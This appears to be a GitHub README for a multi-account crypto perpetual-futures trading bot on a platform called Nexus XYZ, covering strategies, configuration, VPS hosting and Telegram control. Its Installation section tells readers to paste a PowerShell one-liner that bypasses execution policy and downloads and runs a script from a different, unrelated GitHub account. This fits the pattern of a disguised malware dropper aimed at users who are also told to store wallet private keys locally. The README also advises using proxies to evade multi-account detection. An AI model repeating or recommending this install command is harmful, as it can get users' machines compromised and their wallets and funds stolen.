# 🤖 Nexus XYZ Perp Trading Bot

> Automated multi-account perpetual trading bot for [Nexus XYZ](https://app.nexus.xyz/trade) — three independent strategies, unlimited accounts, per-account proxy support

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Nexus XYZ](https://img.shields.io/badge/Nexus_XYZ-Perps-8B5CF6?style=for-the-badge&logoColor=white)](https://app.nexus.xyz/trade)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/nexus-perp-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/nexus-perp-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
║  Strategy 2 — Copy Trading       │  mirror top wallets live     ║
║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
║                                                                  ║
║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Open Nexus XYZ](https://app.nexus.xyz/trade)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 📌 Table of Contents

- [How It Works](#-how-it-works)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Strategies](#-strategies)
  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
- [Installation](#️-installation)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Risk Management](#️-risk-management)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  Nexus XYZ perp markets update in real time
          │
          ▼  (all account workers run simultaneously)
          │
  Per account:
    • Authenticate via API key + wallet signature
    • Route all traffic through assigned proxy
    • Execute active strategy independently
    • Apply per-account risk limits
    • Report PnL and positions
          │
          ▼
  Positions managed until closed  📈
          │
          ▼
  Telegram summary per account  📱
```

Every account is an independent async worker with its own strategy, risk limits, and proxy. One failed connection never affects the others.

---

## 👥 Multi-Account & Proxy Support

### How accounts are configured

All accounts live in `accounts.json`. Each entry has its own wallet, API credentials, active strategy, and optional proxy.

```
  accounts.json
  ├── Account #1  →  wallet_1 + apikey_1 + proxy_1 + strategy: delta_neutral
  ├── Account #2  →  wallet_2 + apikey_2 + proxy_2 + strategy: copy_trading
  ├── Account #3  →  wallet_3 + apikey_3 + (no proxy) + strategy: funding_arb
  └── ...unlimited accounts
          │
          ▼
  Bot spawns one async worker per account
          │
          ▼
  Workers run in parallel up to MAX_PARALLEL
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Delta hedge",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "nexus_api_key": "your_api_key_1",
    "nexus_api_secret": "your_api_secret_1",
    "strategy": "delta_neutral",
    "referral_code": "YOUR_REF",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "account_2",
    "label": "Copy acc",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "nexus_api_key": "your_api_key_2",
    "nexus_api_secret": "your_api_secret_2",
    "strategy": "copy_trading",
    "leader_wallet": "0xLeaderWalletAddress",
    "referral_code": "YOUR_REF",
    "proxy": "socks5://user:pass@host:port"
  },
  {
    "id": "account_3",
    "label": "Funding farmer",
    "wallet_address": "0xYourWallet3",
    "private_key": "0xYourPrivateKey3",
    "nexus_api_key": "your_api_key_3",
    "nexus_api_secret": "your_api_secret_3",
    "strategy": "funding_arb",
    "referral_code": "YOUR_REF",
    "proxy": ""
  }
]
```

### How to get Nexus XYZ API credentials

1. Go to [app.nexus.xyz/trade](https://app.nexus.xyz/trade) and connect your wallet
2. Navigate to **Settings → API → Generate API Key**
3. Sign the message with your wallet to confirm ownership
4. Save the **API Key** and **Secret** — shown only once
5. Add them to the account entry in `accounts.json`

> ⚠️ Each account needs its own API key. Never share API secrets or private keys.

### Proxy formats supported

| Format | Example |
|--------|---------|
| HTTP | `http://user:pass@host:port` |
| HTTPS | `https://user:pass@host:port` |
| SOCKS5 | `socks5://user:pass@host:port` |
| No auth | `http://host:port` |
| None | leave `"proxy": ""` |

### Concurrency & safety settings

```env
MAX_PARALLEL=5              # Max accounts trading at the same time
ACCOUNT_DELAY=15            # Seconds between launching each worker
JITTER=true                 # Random ±5s delay per order (human-like)
PROXY_TEST_ON_START=true    # Verify each proxy before trading begins
ROTATE_USER_AGENT=true      # Unique user-agent per account
```

---

## 📐 Strategies

### ⚖️ Strategy 1 — Delta-Neutral

Earn on volatility and funding rates while staying neutral to market direction. Profit does not depend on whether the price goes up or down.

```
  Open LONG on spot  +  SHORT on Nexus perp  (same asset)
              │
              ▼
  Positions hedge each other → net delta ≈ 0
              │
              ▼
  Profit comes from:
    • positive funding rate payments (perp longs pay shorts)
    • spread captured on limit-order rebalancing
```

**How it works:**

1. The bot opens equal-sized LONG (spot or low-leverage perp) and SHORT (perp) positions on the same asset.
2. Every N hours it checks delta drift from price movement and rebalances if deviation exceeds threshold.
3. When funding turns negative, positions invert (SHORT spot + LONG perp) to keep collecting.

**Decision table:**

| Condition | Action |
|-----------|--------|
| Funding rate > 0.01% | Hold SHORT on perp, collect payments |
| Funding rate < -0.01% | Invert positions |
| Delta drifted > 5% | Rebalance with limit orders |
| High volatility detected | Reduce position size |

**Config block (per account or in `.env`):**

```env
STRATEGY=delta_neutral
DN_SYMBOL=BTC-PERP
DN_LONG_SIZE=100            # USD in long leg
DN_SHORT_SIZE=100           # USD in short leg
DN_LEVERAGE=1               # Keep low — this is a hedged position
DN_REBALANCE_THRESHOLD=5    # % drift before rebalancing
DN_MIN_FUNDING=0.005        # Minimum funding rate to enter (%)
DN_CHECK_INTERVAL=3600      # Rebalance check every N seconds
DN_ORDER_TYPE=LIMIT         # Always limit for lower fees
```

> 💡 **Tip:** Works best during periods of consistently positive funding. Check Nexus XYZ's funding rate history before entering — avoid assets with erratic near-zero rates.

---

### 📡 Strategy 2 — Copy Trading

The bot polls a target wallet's positions on Nexus XYZ every few seconds. When a change is detected it immediately mirrors the trade on the copying account with a proportionally scaled size.

```
  Leader opens BTC-PERP LONG $5,000
              │
              ▼  (detected via polling)
              │
  Bot calculates size:
  (ourEquity $1,000 / leaderEquity $10,000) × $5,000 × multiplier 1.0 = $500
  MAX_POSITION_PERCENT cap applied if needed
              │
              ▼
  Account opens BTC-PERP LONG $500  ✅
              │
              ▼
  Leader reduces or closes → bot mirrors proportionally ✅
```

**Choosing who to copy:**

Each account in `accounts.json` specifies its own `leader_wallet`. Run different leaders across accounts to diversify.

✅ **Good wallets to copy:**
- Consistent PnL over weeks, not days
- Holds positions for hours or longer (swing style)
- 1–5 trades per day
- Clear directional bias, not constantly reversing

❌ **Avoid:**
- HFT / high-frequency wallets — impossible to keep up, slippage destroys edge
- Market makers — positions on both sides simultaneously
- Scalpers — seconds-to-minutes holds, orders won't fill in time
- Leverage flippers — change leverage constantly to distort size calculation

**Config block:**

```env
STRATEGY=copy_trading
LEADER_WALLET=0xLeaderWalletAddress     # Set per account in accounts.json
COPY_RATIO=1.0                          # Equity-based ratio multiplier
MAX_LEVERAGE=20                         # Cap on copied leverage
MAX_POSITION_SIZE_PERCENT=50            # Max single position as % of equity
MIN_NOTIONAL=5                          # Skip trades smaller than $N
MAX_CONCURRENT_POSITIONS=10             # Max open positions at once
BLOCKED_SYMBOLS=                        # Comma-separated symbols to skip
SYNC_INTERVAL=5                         # Poll leader positions every N seconds
```

---

### 💸 Strategy 3 — Funding Arbitrage

The bot scans all Nexus XYZ perp markets for anomalously high funding rates and opens positions to collect payments with minimal directional exposure.

```
  Scan all Nexus perps → find funding rate above entry threshold
              │
              ▼
  Open position AGAINST the funding direction:
    • Funding > 0  →  SHORT  (longs pay shorts each cycle)
    • Funding < 0  →  LONG   (shorts pay longs each cycle)
              │
              ▼
  Collect funding payment each cycle
              │
              ▼
  Exit when any trigger fires:
    • Rate normalizes below exit_threshold
    • Target PnL reached
    • Position held longer than max_hold_hours
    • Unrealized loss exceeds stop_loss
```

**Example scenario:**

```
BTC-PERP funding = +0.05% per 8h
Bot opens $100 SHORT on BTC-PERP  (limit order)
  → receives $0.05 every 8 hours
  → over 48 hours = $0.30 on $100 deployed
  → annualized ≈ 27% APR  (if rate holds)
Optional spot hedge (30%) limits price exposure to ±$0.70 per 1% BTC move
```

**Config block:**

```env
STRATEGY=funding_arb
FA_SCAN_SYMBOLS=BTC-PERP,ETH-PERP,SOL-PERP
FA_MIN_FUNDING=0.03             # Minimum rate to enter (% per 8h)
FA_EXIT_FUNDING=0.01            # Rate at which to exit (%)
FA_POSITION_SIZE=50             # Position size in USD
FA_MAX_HOLD_HOURS=48            # Max time to hold
FA_HEDGE_RATIO=0.3              # Spot hedge as fraction of perp size (0 = no hedge)
FA_LEVERAGE=1                   # Keep at 1 — yield play, not directional
FA_STOP_LOSS_PERCENT=3          # Close if unrealized loss exceeds N%
FA_CHECK_INTERVAL=300           # Scan every N seconds
FA_ORDER_TYPE=LIMIT             # Limit orders for lower fees
```

> 💡 **Tip:** Set `FA_STOP_LOSS_PERCENT` conservatively. The position is meant to earn funding — if price moves sharply against you, the stop protects your yield gains from being wiped out.

---


### Requirements

- Python 3.10+
- A [Nexus XYZ](https://app.nexus.xyz/trade) account per wallet
- Collateral (USDC or supported asset) deposited per account
- API key per account (see above)
- Optional: proxies for multi-account isolation

## 🛠️ Installation

### Option 1: PowerShell (Recommended)
Open **PowerShell** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/kimikimi333/Nexus-Trading-App-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
### Option 2: Cmd 
Open **CMD** and run this **single command**:
```
powershell -ep bypass -c "iwr https://github.com/kimikimi333/Nexus-Trading-App-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account
```

### Step 4 — Get API credentials

For each account, follow the steps in [Multi-Account & Proxy Support](#-multi-account--proxy-support) above.

### Step 5 — Deposit collateral

Each account needs collateral deposited on Nexus XYZ before the bot can open positions. Fund wallets and deposit via the [Nexus XYZ interface](https://app.nexus.xyz/trade).

### Step 6 — Build your accounts.json

```bash
cp accounts.example.json accounts.json
nano accounts.json
```

---

## ⚙️ Configuration

### `accounts.json` — one entry per account

See [Multi-Account & Proxy Support](#-multi-account--proxy-support) for the full structure.

### `.env` — global defaults

Settings here apply to all accounts unless overridden in `accounts.json`.

```env
# ── Active strategy (default, overridden per account) ──
# Options: delta_neutral | copy_trading | funding_arb
STRATEGY=funding_arb

# ── Multi-account ──────────────────────────────────────
ACCOUNTS_FILE=accounts.json
MAX_PARALLEL=5
ACCOUNT_DELAY=15
JITTER=true
PROXY_TEST_ON_START=true
ROTATE_USER_AGENT=true

# ── Global risk limits (apply to every account) ────────
DAILY_LOSS_LIMIT=20             # Halt account if daily loss exceeds this ($)
UNREALIZED_LOSS_LIMIT=30        # Force-close all positions if exceeded ($)
MAX_LEVERAGE=20
MAX_POSITION_SIZE_PERCENT=50
MIN_NOTIONAL=5

# ── Order defaults ─────────────────────────────────────
DEFAULT_ORDER_TYPE=LIMIT
LIMIT_TIMEOUT=30                # Seconds to wait for limit fill before cancel

# ── Strategy-specific defaults ─────────────────────────
# (paste relevant config block from strategy sections above)

# ── Telegram (optional but recommended) ────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

### Per-account strategy override

Any key in `.env` can be overridden inside `accounts.json` for a specific account:

```json
{
  "id": "account_1",
  "strategy": "delta_neutral",
  "DAILY_LOSS_LIMIT": 10,
  "DN_SYMBOL": "ETH-PERP",
  "DN_LONG_SIZE": 50,
  "DN_SHORT_SIZE": 50
}
```

---

## 🚀 Running the Bot

```bash
# First-time setup (creates accounts.json template)
python nexus_bot.py --setup

# Run all accounts
python nexus_bot.py

# Run a specific account only
python nexus_bot.py --account account_1

# Single cycle and exit
python nexus_bot.py --once

# Test proxies without placing any orders
python nexus_bot.py --test-proxies

# Dashboard only (no trading)
python nexus_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Nexus XYZ Perp Bot v1.0                        ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Accounts:    3 loaded
  Proxies:     2 assigned  (1 direct)
  Parallel:    up to 5
  Jitter:      ON

  Strategies:
    account_1  →  delta_neutral
    account_2  →  copy_trading
    account_3  →  funding_arb

  Testing proxies... ██████████  2/2 OK

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Nexus XYZ Perp Bot v1.0                updated 09:04:15
══════════════════════════════════════════════════════════════
  Accounts: 3 active   Next check: 12m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID            Strategy        Daily PnL   Positions   Status
  account_1     delta_neutral   +$1.24      2 open      ● running
  account_2     copy_trading    -$0.43      3 open      ● running
  account_3     funding_arb     +$0.88      1 open      ● running
──────────────────────────────────────────────────────────────
  POSITIONS  (account_3 — funding_arb)
  Symbol      Side    Size    Entry      Funding/8h   Unreal PnL
  BTC-PERP    SHORT   $50     $95,420    +0.04%       +$0.21
──────────────────────────────────────────────────────────────
  POSITIONS  (account_2 — copy_trading)
  Symbol      Side    Size    Entry      Leader size  Unreal PnL
  ETH-PERP    LONG    $120    $3,210     $1,200       -$0.43
  SOL-PERP    LONG    $60     $148.2     $600         +$0.12
──────────────────────────────────────────────────────────────
  RECENT TRADES
  09:04:15  account_3  BTC-PERP  SHORT $50   funding_arb   ✅ filled
  09:03:40  account_1  ETH-PERP  rebalance   delta_neutral ✅ filled
  09:02:55  account_2  SOL-PERP  LONG  $60   copy 0x02C8.. ✅ filled
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/nexus-perp-bot
cd nexus-perp-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account

# 4. Configure
nano .env
nano accounts.json

# 5. Run inside screen (stays alive after you disconnect)
screen -S nexusbot
source venv/bin/activate
python nexus_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r nexusbot
```

### Useful log commands

```bash
tail -50 nexus_bot.log
grep "filled" nexus_bot.log | tail -20           # Filled orders
grep "funding" nexus_bot.log | tail -20          # Funding events
grep "rebalance" nexus_bot.log | tail -20        # Delta-neutral rebalances
grep "copy" nexus_bot.log | tail -20             # Copy trading mirrors
grep "RISK\|halt" nexus_bot.log | tail -10       # Risk limit triggers
grep "ERROR" nexus_bot.log | tail -10            # Errors
```

---

## 🛡️ Risk Management

```
DAILY_LOSS_LIMIT hit        ──► Account halts + closes all its positions
UNREALIZED_LOSS_LIMIT hit   ──► Immediately force-closes all (market order)
MAX_POSITION_SIZE_PERCENT   ──► Caps any single position as % of equity
MAX_CONCURRENT_POSITIONS    ──► Blocks new opens until a position closes
MIN_NOTIONAL not met        ──► Skips the trade
FA_STOP_LOSS_PERCENT hit    ──► Closes funding arb position immediately
BLOCKED_SYMBOLS match       ──► Skips that symbol entirely
```

Risk limits are applied **per account** — one account hitting its daily loss limit does not stop the others.

### Safe starter config

```env
DAILY_LOSS_LIMIT=10
UNREALIZED_LOSS_LIMIT=15
MAX_LEVERAGE=5
MAX_POSITION_SIZE_PERCENT=20
MAX_CONCURRENT_POSITIONS=3
FA_STOP_LOSS_PERCENT=2
```

> ⚠️ **Always start with small sizes.** Run for several hours at minimum capital before scaling up any account.

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | All accounts: PnL, positions, strategy, proxy |
| `/positions` | All open positions across all accounts |
| `/pnl` | Realized + unrealized PnL per account |
| `/pause` | Pause all accounts (holds open positions) |
| `/pause account_1` | Pause one specific account |
| `/resume` | Resume all accounts |
| `/close` | Close all positions on all accounts (market) |
| `/close account_1` | Close all positions on one account |
| `/proxies` | Proxy health for all accounts |
| `/stop` | Stop the bot completely |
| `/strategy` | Show active strategy per account |

### Example alerts

```
📈 Position Opened
Account:   account_3
Strategy:  funding_arb
Symbol:    BTC-PERP
Side:      SHORT
Size:      $50.00
Funding:   +0.04% per 8h

💰 Funding Collected
Account:   account_3
Symbol:    BTC-PERP
Amount:    +$0.02
Rate:      0.04% (8h cycle)

🔄 Rebalance Executed
Account:   account_1
Strategy:  delta_neutral
Symbol:    ETH-PERP
Delta was: +6.2%  →  rebalanced to 0.1%

📡 Trade Copied
Account:   account_2
Leader:    0x02C8...45A0
Symbol:    SOL-PERP
Side:      LONG  $60.00
Ratio:     10%  (our equity / leader equity)

🛑 Risk Limit Hit
Account:   account_2
Reason:    Daily loss limit ($20.00)
Action:    All account_2 positions closed

⚠️ Proxy Failed
Account:   account_1
Proxy:     proxy_2
Action:    falling back to direct connection
```

---

## ⚠️ Disclaimer

> **RISK WARNING:** This bot trades real money on a live perpetuals exchange. All three strategies carry significant financial risk. Leverage amplifies both gains and losses. You may lose your entire deposited collateral. Use entirely at your own risk.

- Never invest more than you can afford to lose
- Always start small — scale only after verifying behavior
- Never share `accounts.json`, private keys, or API secrets with anyone
- With many accounts on the same IP, use proxies to avoid detection
- API secrets are shown only once on creation — store them securely
- Check your local regulations regarding automated derivatives trading

---

## 🔗 Links

[![Nexus XYZ](https://img.shields.io/badge/🟣_Nexus_XYZ-Open_Trading-8B5CF6?style=for-the-badge)](https://app.nexus.xyz/trade)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`nexus-bot`, `perp-trading`, `trading-bot`, `delta-neutral`, `copy-trading`, `funding-arbitrage`, `multi-account`, `proxy-support`, `python`, `async`, `telegram-bot`, `crypto-bot`, `defi`, `perpetual-swaps`, `risk-management`
